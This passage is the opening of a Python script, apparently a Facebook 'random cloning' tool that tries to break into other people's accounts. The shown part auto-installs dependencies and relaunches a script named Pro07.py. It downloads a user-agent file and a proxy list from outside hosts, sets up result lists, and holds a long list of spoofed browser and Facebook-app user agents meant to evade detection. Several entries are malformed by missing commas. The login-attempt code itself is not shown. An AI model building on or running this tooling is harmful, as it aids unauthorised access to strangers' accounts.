#created by Mirwais Danishyar 
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit

###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Pro07.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '{RED}'
H = '{GREEN}'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
import random
cokbrut=[]
ses=requests.Session()
princp=[]
twf =[]
user=[]
ugen=[]
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()

loop = 0
cp = []
ok = []
twf = []
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()
agents = [

     "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 "Mozilla/5.0 (Linux; Android 11; I1927) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L523T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4782.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M349Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4755.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S840H) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4283.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J425L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4552.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B975X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4251.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P472Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4861.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q844J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4682.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q722F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4880.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B779Z) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4882.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K782V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4655.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L965Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4386.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O868O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4210.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D432P) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4221.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C63T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4801.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S815O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4727.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A669J) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4868.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y536Z) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4893.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y610J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y907L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4684.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J775N) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4760.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R132G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4247.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y278P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4789.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N344N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4220.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A741P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4688.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z235C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K314J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4387.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D553Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4594.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N569N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4885.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S335R) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4319.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S102C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4624.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E473M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4362.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L431O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4416.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W337Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4598.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S680Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4370.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q341X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4444.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q123K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4339.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F702H) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4886.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C346X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W907P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4272.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S675P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4875.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S242A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4746.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D125S) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O690L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4827.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T191S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4757.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H70Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4544.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J758G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4422.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M860R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4594.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q194M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4889.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y170X) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4817.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A706W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4405.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I883A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D264R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4466.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S583I) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4853.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C449R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4637.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J908A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4667.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U921A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4760.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L525A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4418.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K497Y) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4518.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I301P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4427.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A352M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4423.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A684P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L679E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4509.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F745Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C46A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4215.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F376J) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4763.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M790H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4533.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F824J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4553.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J126J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4348.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q27V) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4315.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J770M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T317O) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4471.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W251T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4363.87 Chrome/105.0.0.0 Safari/537.36',
 "Mozilla/5.0 (Linux; Android 11; Redmi K30i 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 11; XQ-AS72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 8T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
  "Mozilla/5.0 (Linux; Android 11; LM-K830) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:106.0) Gecko/106.0 Firefox/106.0",
  "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.118 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]",
  "Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
  "Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",
  "Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
  "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/386.0.0.35.108;]",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A716U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57310",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A716V Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/9.0.2254.57848",
  "Mozilla/5.0 (Linux; U; Android 10; SM-A716U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/9.0.2254.57848",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A716U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/8.7.2254.57455",
  "Mozilla/5.0 (Linux; U; Android 12; SM-A716U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/10.6.2254.62600",
  "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
  "Mozilla/5.0 (Linux; Android 11; SM-A716V Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 TapResearch Multi Window",
  "Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.0.0.24.132;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/355.0.0.17.114;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/342.0.0.37.119;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/333.0.0.17.119;]",
  "Mozilla/5.0 (Linux; Android 11; SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 EdgA/97.0.1072.55",
  "Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N981B/N981BXXS5FVH7) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]",
  "Mozilla/5.0 (Linux; Android 10; SM-N981B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/279.0.0.19.120;]",
  "Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
  "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]",
  "Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]",
  "Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/365.0.0.30.112;]",
  "Mozilla/5.0 (Linux; Android 11; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Mobile Safari/537.36 EdgA/103.0.1264.47",
  
  
  
  
  
  "Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]",
  "Mozilla/5.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/10.6.2254.62601",
  "Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/225.0.0.9.114;] [ip:213.32.4.102]",
  "Mozilla/5.0 (Android 10; samsung SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0",
  "Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]",
  "Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
  "Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]",
  "Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/3.0.2 Chrome/89.0.4389.72 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 WpsMoffice/16.4/arm64-v8a/1334",
  "Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 WpsMoffice/16.3.3/arm64-v8a/1329",
  "Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]",
  "Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
  "Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
